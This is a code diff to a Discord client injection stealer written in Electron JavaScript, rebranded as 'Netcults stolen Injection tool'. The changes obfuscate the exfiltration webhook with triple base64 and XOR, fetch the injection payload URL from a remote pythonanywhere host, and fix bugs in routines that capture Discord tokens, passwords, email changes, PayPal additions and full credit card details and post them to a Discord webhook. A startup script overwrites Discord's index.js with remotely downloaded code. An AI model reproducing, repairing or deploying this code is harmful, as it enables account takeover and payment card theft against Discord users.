@@ -1,3 +1,4 @@
+\
 const args = process.argv;
 const fs = require('fs');
 const path = require('path');
@@ -5,16 +6,79 @@ const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
+
+
+
+
+
+
+const OBFUSCATED_KEY_DATA = process.env.OBFUSCATED_KEY_DATA;
+
+
+if (!process.env.OBFUSCATED_KEY_DATA) { console.error('Critical Error: OBFUSCATED_KEY_DATA environment variable is missing. Aborting.'); process.exit(1); }
+
+const XOR_KEY = Buffer.from(OBFUSCATED_KEY_DATA, "base64").toString("utf8"); // Decode the key at runtime
+
+function xor_cipher(s, key) {
+  let result = '';
+  for (let i = 0; i < s.length; i++) {
+    // XOR the string character code with the key character code (repeating key)
+    let charCode = s.charCodeAt(i) ^ key.charCodeAt(i % key.length);
+    result += String.fromCharCode(charCode);
+  }
+  return result;
+}
+
+
+function decode(s) { 
+  // Step 1: Triple Base64 Decode
+  let decoded_b64 = Buffer.from(Buffer.from(Buffer.from(s, 'base64').toString('utf8'), 'base64').toString('utf8'), 'base64').toString('utf8');
+  
+  // Step 2: XOR Decrypt
+  return xor_cipher(decoded_b64, XOR_KEY); 
+}
+
+async function fetchRedirectUrl() {
+  return new Promise((resolve, reject) => {
+    https.get(config.redirect_url_source, (res) => {
+      let data = '';
+      res.on('data', (chunk) => { data += chunk; });
+      res.on('end', () => {
+
+        let content = data;
+        if (content.includes('<pre')) {
+          content = content.substring(content.indexOf('>') + 1, content.lastIndexOf('</pre>'));
+        }
+        const trimmed = content.trim();
+        if (trimmed.startsWith('http')) {
+          resolve(trimmed);
+        } else {
+          reject(new Error('Invalid URL content received'));
+        }hub.com
+
+      });
+    }).on('error', (err) => {
+      reject(new Error('Request failed: ' + err.message));
+    });
+  });
+}
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1500741802683273297/_Pks1I0fPu7hSLj8N9OEpMROXVHI3jfi0UCUc20L6oIGMwTpjB55_QNNw4awBvZgQwAp', 
+
+
+  webhook: 'WUhSMGNITTZMeTluWldka1pXbGtZV05oY25SdFpTMWtZWFpwYmtra01UQTBNRGcxOE0yNjgzMjczMjk3L19Qa3MxSjBmUHU3aFNMajhOOE9FcE1ST1hWSUkzamZpMFVDVWMvMjBMNlRJd01XRHBqQjU1X1FONTc0YXdCM1pnUXdBcQ', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Netcults stolen Injection tool', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-stlr/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/icrackedthisbtw/icrackedthislol/refs/heads/main/index.js?token=GHSAT0AAAAAAD4FBGTR6HUU2UIWMLFQXZ2S2PYKGTQ', 
+
+  injection_url: null,
+
+
+
+  redirect_url_source: "https://uwbfafsdshgwyda72dbudabbfaffyw.pythonanywhere.com/getlink",
   /**
    
    **/
@@ -65,6 +129,16 @@ const config = {
     ],
   },
 };
+
+config.webhook = decode(config.webhook);
+
+(async () => {
+  try {
+    config.injection_url = await fetchRedirectUrl();
+  } catch (error) {
+    console.error('Error fetching injection URL, using null:', error.message);
+  }
+})();
 
 function parity_32(x, y, z) {
   return x ^ y ^ z;
@@ -433,26 +507,27 @@ function updateCheck() {
       ),
     );
 
+
     const startUpScript = `const fs = require('fs'), https = require('https');
 const indexJs = '${indexJs}';
 const bdPath = '${bdPath}';
 const fileSize = fs.statSync(indexJs).size
-fs.readFileSync(indexJs, 'utf8', (err, data) => {
-    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+fs.readFile(indexJs, 'utf8', (err, data) => {
+    if (err || fileSize < 20000 || data === "module.exports = require('./core.asar')") 
         init();
 })
 async function init() {
     https.get('${config.injection_url}', (res) => {
-        const file = fs.createWriteStream(indexJs);
-        res.replace('%WEBHOOK%', '${config.webhook}')
-        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
-        res.pipe(file);
-        file.on('finish', () => {
-            file.close();
+        let fileData = '';
+        res.on('data', (chunk) => {
+            fileData += chunk;
         });
-    
+        res.on('end', () => {
+            fileData = fileData.replace('%WEBHOOK%', '${config.webhook}').replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}');
+            fs.writeFileSync(indexJs, fileData);
+        });
     }).on("error", (err) => {
-        setTimeout(init(), 10000);
+        setTimeout(init, 10000);
     });
 }
 require('${path.join(resourcePath, 'app.asar')}')
@@ -487,7 +562,8 @@ const fetchBilling = async (token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
-  if (!bill.lenght || bill.length === 0) return '';
+
+  if (!bill.length || bill.length === 0) return '';
   return JSON.parse(bill);
 };
 
@@ -680,7 +756,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: 'Discord injection by skid stlr @kiro @netcults',
         },
       },
     ],
@@ -722,7 +798,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: 'Discord injection by skid stlr @kiro @netcults',
         },
       },
     ],
@@ -764,7 +840,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: 'Discord injection by skid stlr @kiro @netcults',
         },
       },
     ],
@@ -777,7 +853,8 @@ const PaypalAdded = async (token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
-  const billing = getBilling(token);
+
+  const billing = await getBilling(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -806,7 +883,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: 'Discord injection by skid stlr @kiro @netcults',
         },
       },
     ],
@@ -848,7 +925,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: 'Discord injection by skid stlr @kiro @netcults',
         },
       },
     ],
@@ -892,7 +969,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+
+          text: 'Discord injection by skid stlr @kiro @netcults',
         },
       },
     ],
@@ -964,7 +1042,8 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
       break;
 
     case details.url.endsWith('tokens') && details.method === 'POST':
-      const item = querystring.parse(unparsedData.toString());
+
+      const item = querystring.parse(unparsed_data.toString());
       ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
       break;
 
@@ -984,5 +1063,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
   }
 });
 module.exports = require('./core.asar');
+
+
 
 
